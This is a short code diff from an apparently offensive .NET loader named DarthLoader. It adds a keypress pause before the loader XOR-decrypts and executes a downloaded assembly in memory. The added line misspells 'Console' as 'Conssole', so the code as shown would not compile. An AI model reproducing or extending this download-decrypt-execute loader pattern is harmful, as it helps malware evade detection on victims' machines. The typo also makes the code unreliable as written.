@@ -82,6 +82,9 @@ namespace DarthLoader
                 {
                     Console.WriteLine("[!] .Net assembly downloaded!");
 
+                    Conssole.WriteLine("[+] Hit any key to run the assembly...");
+                    Console.ReadKey();
+
                     Console.WriteLine("[*] Decrypting and executing assembly...");
                     ExecuteAssembly(Utilities.Xor(programBytes, key));
 
